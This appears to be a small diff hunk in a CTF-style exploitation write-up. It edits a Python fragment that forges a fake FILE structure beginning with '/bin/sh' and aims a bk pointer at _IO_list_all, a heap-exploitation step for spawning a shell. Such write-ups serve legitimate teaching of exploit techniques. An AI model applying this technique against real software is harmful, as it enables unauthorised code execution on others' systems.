@@ -311,7 +311,7 @@ Time to perform the attacks.
 ```python
 fstream  = "/bin/sh\x00"
 fstream += p64(0x61)
-fstream += p64(0xddaa) 
+fstream += p64(0) 
 # bk => _IO_list_all
 fstream += p64(iolist-0x10)
 fstream += p64(2)
